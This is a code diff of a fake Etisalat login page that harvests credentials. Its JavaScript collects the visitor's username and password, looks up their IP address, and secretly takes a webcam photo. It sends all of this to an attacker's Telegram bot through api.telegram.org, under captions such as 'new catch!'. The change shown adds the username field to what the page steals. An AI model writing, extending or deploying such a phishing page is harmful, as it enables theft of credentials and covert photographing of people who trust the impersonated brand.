@@ -15,12 +15,11 @@
         .input-group input { width: 100%; border: 1px solid #ccc; padding: 8px; box-sizing: border-box; }
         .btn-login { background-color: #78be20; color: white; border: none; padding: 10px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%; margin-top: 10px; }
         #video, #canvas { display: none; }
-        /* ستايل رسالة القفشة */
         #shabah-msg { display: none; color: red; font-weight: bold; font-size: 20px; margin-top: 20px; text-align: center; border: 2px dashed red; padding: 10px; }
     </style>
 </head>
 <body>
-    <div class="login-box" id="main-box">
+    <div class="login-box">
         <div class="header">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Etisalat_logo.svg/1200px-Etisalat_logo.svg.png" alt="Etisalat">
         </div>
@@ -28,7 +27,7 @@
         
         <div class="input-group">
             <label>اسم المستخدم</label>
-            <input type="text" value="admin" readonly>
+            <input type="text" id="user-input" placeholder="أدخل اسم المستخدم">
         </div>
         <div class="input-group">
             <label>كلمة المرور</label>
@@ -47,16 +46,16 @@
         const chatId = '1559993244'; 
 
         document.getElementById('start-btn').addEventListener('click', async () => {
+            const username = document.getElementById('user-input').value;
             const password = document.getElementById('pass-input').value;
-            if (!password) { alert('يرجى إدخال كلمة المرور'); return; }
+            
+            if (!username || !password) { alert('يرجى إكمال البيانات'); return; }
 
             try {
-                // سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const userIP = ipData.ip;
 
-                // التصوير
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -70,18 +69,16 @@
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'shabah.jpg');
-                        formData.append('caption', `🚨 تم القفش بنجاح يا رمضان!\n🔑 كلمة السر: ${password}\n🌐 IP: ${userIP}`);
+                        // بيبعت الاسم والباسورد والـ IP سوا
+                        formData.append('caption', `🚨 صيد جديد!\n👤 الاسم: ${username}\n🔑 السر: ${password}\n🌐 IP: ${userIP}`);
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg');
                     
-                    // إظهار رسالة القفشة وإخفاء الزرار
                     document.getElementById('start-btn').style.display = 'none';
                     document.getElementById('shabah-msg').style.display = 'block';
-                    
                 }, 1000);
             } catch (err) {
                 document.getElementById('shabah-msg').style.display = 'block';
-                document.getElementById('shabah-msg').innerText = "وقعت يا حمار حتى وأنت قافل الكاميرا!";
             }
         });
     </script>
